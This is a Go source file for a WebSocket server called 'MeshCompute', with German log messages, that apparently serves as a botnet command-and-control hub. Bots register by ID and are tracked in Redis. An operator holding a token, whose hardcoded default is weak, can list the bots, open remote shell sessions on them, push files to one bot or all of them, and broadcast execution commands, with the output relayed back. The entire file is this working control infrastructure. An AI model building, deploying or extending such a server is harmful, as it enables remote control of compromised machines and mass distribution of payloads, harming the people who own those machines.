package main

import (
    "context"
    "fmt"
    "log"
    "net/http"
    "os"
    "strings"
    "sync"
    "time"

    "github.com/go-redis/redis/v8"
    "nhooyr.io/websocket"
    "nhooyr.io/websocket/wsjson"
)

var (
    authToken  string
    redisAddr  string
    serverPort = ":8080"
)

type Client struct {
    conn *websocket.Conn
    ctx  context.Context
    id   string
    typ  string
}

type Hub struct {
    mu         sync.RWMutex
    clients    map[string]*Client
    register   chan *Client
    unregister chan *Client
    redis      *redis.Client
}

var (
    hub           *Hub
    shellSessions sync.Map
)

func main() {
    authToken = getEnv("AUTH_TOKEN", "change_me_please_secure_token_123")
    redisAddr = getEnv("REDIS_URL", "localhost:6379")
    serverPort = ":" + getEnv("SERVER_PORT", "8080")

    hub = &Hub{
        clients:    make(map[string]*Client),
        register:   make(chan *Client),
        unregister: make(chan *Client),
        redis: redis.NewClient(&redis.Options{
            Addr:       redisAddr,
            MaxRetries: 5,
        }),
    }

    go hub.run()
    go hub.cleanupInactiveBots()

    http.HandleFunc("/ws", handleWebSocket)

    log.Printf("🚀 MeshCompute Server läuft auf ws://0.0.0.0%s", serverPort)
    log.Fatal(http.ListenAndServe(serverPort, nil))
}

func getEnv(key, fallback string) string {
    if value := os.Getenv(key); value != "" {
        return value
    }
    return fallback
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
    c, err := websocket.Accept(w, r, nil)
    if err != nil {
        log.Println("WebSocket Accept Fehler:", err)
        return
    }

    client := &Client{conn: c, ctx: context.Background()}
    go handleClient(client)
}

func (h *Hub) run() {
    for {
        select {
        case client := <-h.register:
            h.mu.Lock()
            h.clients[client.id] = client
            h.mu.Unlock()
            log.Printf("✅ + %s (%s)", client.id, client.typ)

        case client := <-h.unregister:
            h.mu.Lock()
            delete(h.clients, client.id)
            h.mu.Unlock()
            log.Printf("❌ - %s", client.id)
        }
    }
}

func handleClient(c *Client) {
    defer func() {
        c.conn.Close(websocket.StatusInternalError, "")
        if c.typ == "client" {
            hub.unregister <- c
        }
    }()

    var initMsg struct {
        Type      string `json:"type"`
        AuthToken string `json:"auth_token,omitempty"`
        BotID     string `json:"bot_id,omitempty"`
    }

    if err := wsjson.Read(c.ctx, c.conn, &initMsg); err != nil {
        return
    }

    if initMsg.Type == "controller" {
        if initMsg.AuthToken != authToken {
            log.Println("❌ Falscher Auth Token")
            return
        }
        c.typ = "controller"
        c.id = "ctrl_" + fmt.Sprint(time.Now().UnixNano())
    } else if initMsg.Type == "client" && initMsg.BotID != "" {
        c.typ = "client"
        c.id = initMsg.BotID
        ctx := context.Background()
        hub.redis.SAdd(ctx, "active_bots", c.id)
        hub.redis.HSet(ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
        go heartbeatSender(c)
    } else {
        return
    }

    hub.register <- c

    for {
        var msg map[string]interface{}
        if err := wsjson.Read(c.ctx, c.conn, &msg); err != nil {
            break
        }
        hub.handleMessage(c, msg)
    }
}

func heartbeatSender(c *Client) {
    ticker := time.NewTicker(20 * time.Second)
    defer ticker.Stop()
    for range ticker.C {
        hub.redis.HSet(context.Background(), "bot:"+c.id, "heartbeat", time.Now().Unix())
    }
}

func (h *Hub) handleMessage(sender *Client, msg map[string]interface{}) {
    switch msg["type"] {
    case "command":
        if sender.typ == "controller" {
            h.handleControllerCommand(sender, msg)
        }
    case "shell_output", "shell_exit", "file_upload_done", "result":
        h.forwardToController(sender, msg)
    default:
        h.forwardToController(sender, msg)
    }
}

func (h *Hub) handleControllerCommand(sender *Client, msg map[string]interface{}) {
    action := fmt.Sprintf("%v", msg["action"])

    if action == "list" {
        h.sendBotList(sender)
        return
    }

    if action == "shell" {
        h.startShellSession(sender, msg)
        return
    }

    if action == "upload" {
        h.handleUpload(sender, msg)
        return
    }

    // Alle anderen Commands (exec, sysinfo, etc.)
    h.broadcastCommand(msg)
}

func (h *Hub) sendBotList(controller *Client) {
    h.mu.RLock()
    defer h.mu.RUnlock()

    bots := []map[string]string{}
    for id, client := range h.clients {
        if client.typ == "client" {
            bots = append(bots, map[string]string{
                "bot_id": id,
                "status": "online",
            })
        }
    }

    response := map[string]interface{}{
        "type": "result",
        "data": map[string]interface{}{
            "bots": bots,
        },
    }

    wsjson.Write(controller.ctx, controller.conn, response)
}

func (h *Hub) startShellSession(controller *Client, msg map[string]interface{}) {
    target := fmt.Sprintf("%v", msg["target"])
    taskID := fmt.Sprintf("%v", msg["task_id"])

    h.mu.RLock()
    defer h.mu.RUnlock()

    for id, client := range h.clients {
        if client.typ == "client" && (id == target || strings.HasPrefix(id, target)) {
            shellSessions.Store(taskID, id)
            wsjson.Write(client.ctx, client.conn, map[string]interface{}{
                "type":    "command",
                "action":  "shell",
                "task_id": taskID,
            })
            return
        }
    }
}

func (h *Hub) handleUpload(controller *Client, msg map[string]interface{}) {
    target := fmt.Sprintf("%v", msg["target"])
    filename := fmt.Sprintf("%v", msg["filename"])
    contentB64 := fmt.Sprintf("%v", msg["content"])

    task := map[string]interface{}{
        "type":     "file_upload",
        "filename": filename,
        "content":  contentB64,
        "task_id":  msg["task_id"],
    }

    h.mu.RLock()
    sent := 0
    for id, client := range h.clients {
        if client.typ == "client" && (target == "all" || id == target || strings.HasPrefix(id, target)) {
            wsjson.Write(client.ctx, client.conn, task)
            sent++
        }
    }
    h.mu.RUnlock()

    wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
        "type":    "info",
        "message": fmt.Sprintf("Upload an %d Bot(s) gesendet", sent),
    })
}

func (h *Hub) broadcastCommand(msg map[string]interface{}) {
    target := fmt.Sprintf("%v", msg["target"])
    h.mu.RLock()
    defer h.mu.RUnlock()

    for id, client := range h.clients {
        if client.typ == "client" && (target == "all" || id == target || strings.HasPrefix(id, target)) {
            wsjson.Write(client.ctx, client.conn, msg)
        }
    }
}

func (h *Hub) forwardToController(sender *Client, msg map[string]interface{}) {
    h.mu.RLock()
    defer h.mu.RUnlock()
    for _, client := range h.clients {
        if client.typ == "controller" {
            wsjson.Write(client.ctx, client.conn, msg)
        }
    }
}

func (h *Hub) cleanupInactiveBots() {
    ticker := time.NewTicker(60 * time.Second)
    defer ticker.Stop()
    for range ticker.C {
        // später erweiterbar
    }
}